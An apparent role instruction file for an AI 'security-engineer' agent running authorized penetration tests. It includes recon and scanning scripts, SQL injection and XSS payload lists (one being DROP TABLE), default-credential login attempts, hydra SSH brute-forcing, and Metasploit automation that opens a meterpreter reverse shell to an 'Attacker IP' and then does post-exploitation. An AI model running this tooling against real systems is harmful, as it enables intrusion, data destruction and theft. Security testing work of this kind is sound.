# Penetration Testing and Security Audit

**Agent: security-engineer**
**Purpose: Conduct comprehensive penetration testing and security audits to identify vulnerabilities and validate security controls**

---

## 🎯 Mission

Execute systematic penetration testing and security audits to identify vulnerabilities, validate security controls, and ensure robust defense against real-world attacks.

## 📋 Penetration Testing Process

### Step 1: Pre-Engagement and Planning

**Scope Definition and Authorization:**
```yaml
penetration_test_scope:
  test_type: "black_box | gray_box | white_box"
  target_systems:
    - web_applications: ["https://app.example.com", "https://api.example.com"]
    - network_infrastructure: ["10.0.0.0/24", "192.168.1.0/24"]
    - mobile_applications: ["iOS App v2.1", "Android App v2.1"]
    - cloud_infrastructure: ["AWS Production Account", "Azure Dev Environment"]
    
  testing_methodology: "OWASP WSTG | NIST SP 800-115 | PTES"
  
  rules_of_engagement:
    - authorized_users: ["security-engineer@company.com"]
    - testing_window: "2024-01-15T09:00:00 to 2024-01-19T17:00:00"
    - prohibited_actions: ["data_modification", "service_disruption", "social_engineering"]
    - emergency_contacts: ["security-team@company.com", "+1-555-SEC-TEAM"]
    
  compliance_requirements:
    - frameworks: ["SOC2", "PCI-DSS", "GDPR", "HIPAA"]
    - audit_standards: ["ISO 27001", "NIST Cybersecurity Framework"]
```

**Test Environment Preparation:**
```bash
# Kali Linux penetration testing toolkit setup
sudo apt update && sudo apt upgrade -y

# Essential penetration testing tools
sudo apt install -y \
  nmap ncat netdiscover \
  gobuster dirb dirbuster \
  sqlmap burpsuite \
  metasploit-framework \
  nikto wpscan \
  hydra john hashcat \
  wireshark tcpdump \
  aircrack-ng reaver \
  social-engineer-toolkit

# Web application testing tools
pip3 install \
  requests beautifulsoup4 \
  selenium webdriver-manager \
  scrapy paramiko \
  impacket ldap3

# Custom security testing scripts
git clone https://github.com/SecLists/SecLists.git
git clone https://github.com/danielmiessler/SecLists.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
```

### Step 2: Reconnaissance and Information Gathering

**Passive Information Gathering:**
```python
# automated_reconnaissance.py
import requests, subprocess, json
from urllib.parse import urlparse
import dns.resolver, whois

class ReconnaissanceEngine:
    def __init__(self, target_domain):
        self.target = target_domain
        self.results = {}
    
    def passive_reconnaissance(self):
        """Collect information without directly interacting with target"""
        
        # WHOIS information
        self.results['whois'] = self.get_whois_info()
        
        # DNS enumeration
        self.results['dns'] = self.enumerate_dns()
        
        # Certificate transparency logs
        self.results['certificates'] = self.check_certificate_transparency()
        
        # Social media and public information
        self.results['osint'] = self.gather_osint()
        
        # Technology stack identification
        self.results['technology_stack'] = self.identify_technologies()
        
        return self.results
    
    def enumerate_dns(self):
        """Comprehensive DNS enumeration"""
        dns_results = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target, record_type)
                dns_results[record_type] = [str(answer) for answer in answers]
            except Exception as e:
                dns_results[record_type] = f"Error: {str(e)}"
        
        # Subdomain enumeration
        dns_results['subdomains'] = self.enumerate_subdomains()
        
        return dns_results
    
    def enumerate_subdomains(self):
        """Find subdomains using multiple techniques"""
        subdomains = set()
        
        # Certificate transparency
        ct_subdomains = self.check_certificate_transparency()
        subdomains.update(ct_subdomains)
        
        # DNS brute force with common subdomain list
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'api', 'app',
            'dev', 'staging', 'test', 'prod', 'beta',
            'vpn', 'ssh', 'portal', 'dashboard', 'cdn'
        ]
        
        for subdomain in common_subdomains:
            try:
                full_domain = f"{subdomain}.{self.target}"
                answers = dns.resolver.resolve(full_domain, 'A')
                subdomains.add(full_domain)
            except:
                pass
        
        return list(subdomains)
    
    def check_certificate_transparency(self):
        """Query certificate transparency logs"""
        try:
            url = f"https://crt.sh/?q=%.{self.target}&output=json"
            response = requests.get(url, timeout=10)
            certificates = response.json()
            
            subdomains = set()
            for cert in certificates:
                name_value = cert.get('name_value', '')
                subdomains.update(name_value.split('\n'))
            
            return list(subdomains)
        except Exception as e:
            return [f"Error: {str(e)}"]
```

**Active Network Scanning:**
```python
# network_scanner.py
import nmap, socket
from concurrent.futures import ThreadPoolExecutor

class NetworkScanner:
    def __init__(self, target_range):
        self.target_range = target_range
        self.nm = nmap.PortScanner()
    
    def comprehensive_scan(self):
        """Execute comprehensive network scanning"""
        results = {}
        
        # Host discovery
        results['live_hosts'] = self.discover_hosts()
        
        # Port scanning
        results['open_ports'] = self.scan_ports()
        
        # Service identification
        results['services'] = self.identify_services()
        
        # OS fingerprinting
        results['os_detection'] = self.detect_operating_systems()
        
        # Vulnerability scanning
        results['vulnerabilities'] = self.scan_vulnerabilities()
        
        return results
    
    def discover_hosts(self):
        """Discover live hosts in target range"""
        try:
            self.nm.scan(hosts=self.target_range, arguments='-sn -PE -PP -PM')
            live_hosts = []
            
            for host in self.nm.all_hosts():
                if self.nm[host].state() == 'up':
                    live_hosts.append({
                        'ip': host,
                        'hostname': self.nm[host].hostname(),
                        'state': self.nm[host].state()
                    })
            
            return live_hosts
        except Exception as e:
            return [f"Error: {str(e)}"]
    
    def scan_ports(self):
        """Comprehensive port scanning"""
        port_results = {}
        
        # Common ports scan (fast)
        common_ports = "21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900,8080"
        
        try:
            self.nm.scan(self.target_range, common_ports, arguments='-sS -sV')
            
            for host in self.nm.all_hosts():
                host_ports = []
                for protocol in self.nm[host].all_protocols():
                    ports = self.nm[host][protocol].keys()
                    for port in ports:
                        port_info = {
                            'port': port,
                            'protocol': protocol,
                            'state': self.nm[host][protocol][port]['state'],
                            'service': self.nm[host][protocol][port]['name'],
                            'version': self.nm[host][protocol][port]['version']
                        }
                        host_ports.append(port_info)
                
                port_results[host] = host_ports
            
            return port_results
        except Exception as e:
            return {f"Error": str(e)}
    
    def scan_vulnerabilities(self):
        """Run Nmap vulnerability scripts"""
        try:
            vuln_scripts = "--script=vuln,safe,discovery"
            self.nm.scan(self.target_range, arguments=vuln_scripts)
            
            vulnerability_results = {}
            for host in self.nm.all_hosts():
                if 'script' in self.nm[host]:
                    vulnerability_results[host] = self.nm[host]['script']
            
            return vulnerability_results
        except Exception as e:
            return {f"Error": str(e)}
```

### Step 3: Web Application Penetration Testing

**Automated Web Application Testing:**
```python
# web_app_pentest.py
import requests, time, re
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By

class WebAppPentest:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def comprehensive_webapp_test(self):
        """Execute comprehensive web application penetration test"""
        
        # Information gathering
        self.gather_webapp_info()
        
        # Authentication testing
        self.test_authentication()
        
        # Session management testing
        self.test_session_management()
        
        # Input validation testing
        self.test_input_validation()
        
        # Access control testing
        self.test_access_controls()
        
        # Business logic testing
        self.test_business_logic()
        
        return self.vulnerabilities
    
    def test_sql_injection(self, url, parameters):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, username, password FROM users --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
        ]
        
        for param in parameters:
            for payload in sql_payloads:
                test_params = parameters.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for SQL error messages
                    sql_errors = [
                        "SQL syntax error", "mysql_fetch_array()",
                        "ORA-00936", "Microsoft OLE DB Provider",
                        "PostgreSQL query failed", "SQLite error"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': error
                            })
                            break
                
                except Exception as e:
                    continue
    
    def test_xss(self, url, parameters):
        """Test for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>"
        ]
        
        for param in parameters:
            for payload in xss_payloads:
                test_params = parameters.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        # Verify it's not properly encoded
                        if not self.is_properly_encoded(payload, response.text):
                            self.vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'High',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Payload reflected without proper encoding'
                            })
                
                except Exception as e:
                    continue
    
    def test_authentication_bypass(self, login_url):
        """Test authentication bypass techniques"""
        bypass_payloads = [
            {'username': 'admin', 'password': "' OR '1'='1"},
            {'username': 'admin', 'password': "' OR '1'='1' --"},
            {'username': "' OR '1'='1' --", 'password': 'anything'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'administrator', 'password': 'administrator'},
            {'username': 'root', 'password': 'root'}
        ]
        
        for payload in bypass_payloads:
            try:
                response = self.session.post(login_url, data=payload, timeout=10)
                
                # Check for successful authentication indicators
                success_indicators = [
                    'dashboard', 'welcome', 'logout', 'profile',
                    'admin panel', 'control panel'
                ]
                
                for indicator in success_indicators:
                    if indicator.lower() in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'Authentication Bypass',
                            'severity': 'Critical',
                            'url': login_url,
                            'method': 'POST',
                            'payload': payload,
                            'evidence': f"Successfully authenticated with: {payload}"
                        })
                        break
            
            except Exception as e:
                continue
```

### Step 4: Infrastructure Penetration Testing

**Network Service Testing:**
```bash
#!/bin/bash
# infrastructure_pentest.sh

TARGET_IP="$1"
OUTPUT_DIR="pentest_results"
mkdir -p "$OUTPUT_DIR"

echo "[+] Starting Infrastructure Penetration Test for $TARGET_IP"

# Nmap comprehensive scan
echo "[+] Running comprehensive Nmap scan..."
nmap -sS -sV -sC -O -A -T4 -p- \
  --script=vuln,safe,discovery \
  --script-args=unsafe=1 \
  -oA "$OUTPUT_DIR/nmap_comprehensive" \
  "$TARGET_IP"

# Service-specific testing
echo "[+] Testing common services..."

# SSH Testing
if nmap -p 22 --open "$TARGET_IP" | grep -q "22/tcp open"; then
    echo "[+] Testing SSH service..."
    
    # SSH version detection
    ssh -V 2>&1 | tee "$OUTPUT_DIR/ssh_version.txt"
    
    # Common credential testing
    hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
          -P /usr/share/wordlists/metasploit/unix_passwords.txt \
          -t 4 -f "$TARGET_IP" ssh 2>/dev/null | \
          tee "$OUTPUT_DIR/ssh_bruteforce.txt"
fi

# HTTP/HTTPS Testing
if nmap -p 80,443 --open "$TARGET_IP" | grep -q "open"; then
    echo "[+] Testing web services..."
    
    # Directory enumeration
    gobuster dir -u "http://$TARGET_IP" \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
      -x php,html,txt,xml,js \
      -o "$OUTPUT_DIR/gobuster_http.txt"
    
    if nmap -p 443 --open "$TARGET_IP" | grep -q "443/tcp open"; then
        gobuster dir -u "https://$TARGET_IP" \
          -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
          -x php,html,txt,xml,js \
          -k -o "$OUTPUT_DIR/gobuster_https.txt"
    fi
    
    # SSL/TLS testing
    if nmap -p 443 --open "$TARGET_IP" | grep -q "443/tcp open"; then
        sslscan "$TARGET_IP":443 | tee "$OUTPUT_DIR/sslscan.txt"
        testssl.sh "$TARGET_IP":443 | tee "$OUTPUT_DIR/testssl.txt"
    fi
    
    # Web application vulnerability scanning
    nikto -h "http://$TARGET_IP" -o "$OUTPUT_DIR/nikto_http.txt"
    if nmap -p 443 --open "$TARGET_IP" | grep -q "443/tcp open"; then
        nikto -h "https://$TARGET_IP" -o "$OUTPUT_DIR/nikto_https.txt"
    fi
fi

# Database testing
if nmap -p 3306,5432,1433,1521 --open "$TARGET_IP" | grep -q "open"; then
    echo "[+] Testing database services..."
    
    # MySQL testing (port 3306)
    if nmap -p 3306 --open "$TARGET_IP" | grep -q "3306/tcp open"; then
        echo "[+] Testing MySQL..."
        nmap --script=mysql-* -p 3306 "$TARGET_IP" | \
          tee "$OUTPUT_DIR/mysql_scripts.txt"
    fi
    
    # PostgreSQL testing (port 5432)
    if nmap -p 5432 --open "$TARGET_IP" | grep -q "5432/tcp open"; then
        echo "[+] Testing PostgreSQL..."
        nmap --script=pgsql-* -p 5432 "$TARGET_IP" | \
          tee "$OUTPUT_DIR/postgresql_scripts.txt"
    fi
fi

# SMB/NetBIOS testing
if nmap -p 139,445 --open "$TARGET_IP" | grep -q "open"; then
    echo "[+] Testing SMB/NetBIOS services..."
    
    enum4linux -a "$TARGET_IP" | tee "$OUTPUT_DIR/enum4linux.txt"
    smbclient -L "//$TARGET_IP" -N | tee "$OUTPUT_DIR/smbclient.txt"
    nmap --script=smb-vuln-* -p 139,445 "$TARGET_IP" | \
      tee "$OUTPUT_DIR/smb_vulns.txt"
fi

echo "[+] Infrastructure penetration test completed. Results in $OUTPUT_DIR/"
```

### Step 5: Vulnerability Analysis and Exploitation

**Automated Exploitation Framework:**
```python
# exploitation_engine.py
import subprocess, json, time
from metasploit.msfrpc import MsfRpcClient

class ExploitationEngine:
    def __init__(self):
        self.client = MsfRpcClient('password', server='127.0.0.1', port=55552)
        self.exploitable_vulns = []
    
    def analyze_vulnerabilities(self, nmap_results):
        """Analyze scan results for exploitable vulnerabilities"""
        
        # Parse Nmap results
        vulns = self.parse_nmap_vulns(nmap_results)
        
        # Map to Metasploit exploits
        for vuln in vulns:
            exploit_modules = self.find_exploit_modules(vuln)
            if exploit_modules:
                self.exploitable_vulns.append({
                    'vulnerability': vuln,
                    'exploits': exploit_modules,
                    'target': vuln.get('host'),
                    'port': vuln.get('port')
                })
    
    def attempt_exploitation(self, vulnerability):
        """Attempt to exploit identified vulnerability"""
        
        for exploit_info in vulnerability['exploits']:
            try:
                exploit = self.client.modules.use('exploit', exploit_info['module'])
                
                # Set required options
                exploit['RHOSTS'] = vulnerability['target']
                exploit['RPORT'] = vulnerability['port']
                
                # Set payload
                if 'payload' in exploit_info:
                    exploit.payloads = exploit_info['payload']
                else:
                    # Use generic reverse shell
                    exploit.payloads = 'linux/x86/meterpreter/reverse_tcp'
                    exploit['LHOST'] = '192.168.1.100'  # Attacker IP
                    exploit['LPORT'] = '4444'
                
                # Execute exploit
                result = exploit.execute()
                
                if result['job_id']:
                    # Wait for session
                    time.sleep(10)
                    sessions = self.client.sessions.list
                    
                    if sessions:
                        return {
                            'status': 'success',
                            'exploit': exploit_info['module'],
                            'session_id': list(sessions.keys())[0],
                            'target': vulnerability['target']
                        }
            
            except Exception as e:
                continue
        
        return {'status': 'failed', 'target': vulnerability['target']}
    
    def post_exploitation(self, session_id):
        """Perform post-exploitation activities"""
        
        session = self.client.sessions.session(session_id)
        post_exploit_results = {}
        
        # System information
        post_exploit_results['system_info'] = session.run_with_output('sysinfo')
        
        # User information
        post_exploit_results['user_info'] = session.run_with_output('getuid')
        
        # Network information
        post_exploit_results['network_info'] = session.run_with_output('ipconfig')
        
        # Process list
        post_exploit_results['processes'] = session.run_with_output('ps')
        
        # Privilege escalation attempts
        post_exploit_results['privesc'] = self.attempt_privilege_escalation(session)
        
        # Lateral movement opportunities
        post_exploit_results['lateral_movement'] = self.identify_lateral_movement(session)
        
        return post_exploit_results
```

### Step 6: Reporting and Documentation

**Comprehensive Penetration Test Report:**
```python
# pentest_report_generator.py
from datetime import datetime
import json, markdown

class PentestReportGenerator:
    def __init__(self):
        self.report_data = {}
        
    def generate_comprehensive_report(self, test_results):
        """Generate comprehensive penetration test report"""
        
        report = {
            'executive_summary': self.generate_executive_summary(test_results),
            'methodology': self.document_methodology(),
            'scope_and_limitations': self.document_scope(),
            'findings_summary': self.summarize_findings(test_results),
            'detailed_findings': self.document_detailed_findings(test_results),
            'risk_assessment': self.assess_risks(test_results),
            'recommendations': self.generate_recommendations(test_results),
            'appendices': self.generate_appendices(test_results)
        }
        
        return self.format_report(report)
    
    def generate_executive_summary(self, results):
        """Generate executive summary for stakeholders"""
        
        total_vulns = len(results.get('vulnerabilities', []))
        critical_vulns = len([v for v in results.get('vulnerabilities', []) 
                            if v.get('severity') == 'Critical'])
        high_vulns = len([v for v in results.get('vulnerabilities', []) 
                        if v.get('severity') == 'High'])
        
        risk_level = 'Low'
        if critical_vulns > 0:
            risk_level = 'Critical'
        elif high_vulns > 3:
            risk_level = 'High'
        elif high_vulns > 0:
            risk_level = 'Medium'
        
        return {
            'overall_risk_rating': risk_level,
            'total_vulnerabilities': total_vulns,
            'critical_vulnerabilities': critical_vulns,
            'high_vulnerabilities': high_vulns,
            'key_findings': self.extract_key_findings(results),
            'business_impact': self.assess_business_impact(results),
            'immediate_actions': self.recommend_immediate_actions(results)
        }
    
    def document_detailed_findings(self, results):
        """Document detailed vulnerability findings"""
        
        detailed_findings = []
        
        for vuln in results.get('vulnerabilities', []):
            finding = {
                'title': vuln.get('type', 'Unknown Vulnerability'),
                'severity': vuln.get('severity', 'Medium'),
                'cvss_score': vuln.get('cvss_score', 'N/A'),
                'affected_systems': [vuln.get('url') or vuln.get('host')],
                'description': self.generate_vuln_description(vuln),
                'technical_details': {
                    'vulnerability_type': vuln.get('type'),
                    'location': vuln.get('url') or vuln.get('host'),
                    'parameter': vuln.get('parameter'),
                    'payload_used': vuln.get('payload'),
                    'evidence': vuln.get('evidence')
                },
                'impact_assessment': self.assess_vuln_impact(vuln),
                'exploitation_likelihood': self.assess_exploitation_likelihood(vuln),
                'remediation_steps': self.generate_remediation_steps(vuln),
                'references': self.get_vuln_references(vuln)
            }
            detailed_findings.append(finding)
        
        return sorted(detailed_findings, 
                     key=lambda x: self.severity_priority(x['severity']))
    
    def generate_recommendations(self, results):
        """Generate comprehensive security recommendations"""
        
        recommendations = {
            'immediate_actions': [
                'Patch all critical vulnerabilities within 24 hours',
                'Implement temporary mitigations for high-severity issues',
                'Monitor systems for signs of active exploitation',
                'Review and update incident response procedures'
            ],
            'short_term_actions': [
                'Implement comprehensive vulnerability management program',
                'Enhance security monitoring and logging',
                'Conduct security awareness training',
                'Implement multi-factor authentication'
            ],
            'long_term_actions': [
                'Implement security development lifecycle (SDL)',
                'Regular penetration testing program',
                'Security architecture review and hardening',
                'Establish security metrics and KPIs'
            ],
            'technical_recommendations': self.generate_technical_recommendations(results),
            'process_recommendations': self.generate_process_recommendations(results)
        }
        
        return recommendations
```

## 📊 Compliance and Audit Integration

### Security Audit Checklist

```yaml
compliance_audit_checklist:
  owasp_top_10_2021:
    - broken_access_control: "Check for proper authorization controls"
    - cryptographic_failures: "Verify encryption implementation"
    - injection_attacks: "Test for SQL, NoSQL, OS injection"
    - insecure_design: "Review security design patterns"
    - security_misconfiguration: "Audit configuration settings"
    - vulnerable_components: "Check for outdated dependencies"
    - identification_failures: "Test authentication mechanisms"
    - software_data_integrity: "Verify software supply chain"
    - logging_monitoring: "Check security event logging"
    - server_side_forgery: "Test for SSRF vulnerabilities"
    
  pci_dss_requirements:
    - network_security: "Firewall and network segmentation"
    - account_data_protection: "Cardholder data encryption"
    - vulnerability_management: "Regular security testing"
    - access_control: "Role-based access implementation"
    - monitoring: "Security event logging and monitoring"
    - security_policies: "Information security policy compliance"
    
  gdpr_security_requirements:
    - data_protection_by_design: "Privacy by design implementation"
    - data_encryption: "Personal data encryption validation"
    - access_controls: "Data subject access controls"
    - breach_detection: "Data breach detection capabilities"
    - vendor_management: "Third-party security validation"
```

## 📤 Deliverables

- **Penetration Test Plan** with scope, methodology, and timeline
- **Vulnerability Assessment Report** with detailed findings and evidence
- **Risk Assessment Matrix** with business impact analysis
- **Executive Summary** with key findings and recommendations
- **Technical Remediation Guide** with step-by-step fix instructions
- **Compliance Audit Results** mapped to regulatory requirements
- **Penetration Test Artifacts** including scripts, payloads, and evidence

## 🤝 Collaboration Points

**With deployment-engineer:** Infrastructure hardening and security configuration
**With api-engineer:** Secure coding practices and API security validation
**With reviewer:** Security findings validation and remediation prioritization
**With qa-engineer:** Security testing integration and automation
**With business-analyst:** Business impact assessment and risk communication

---
*Comprehensive penetration testing validates security controls and identifies vulnerabilities before attackers can exploit them, ensuring robust defense against real-world threats.*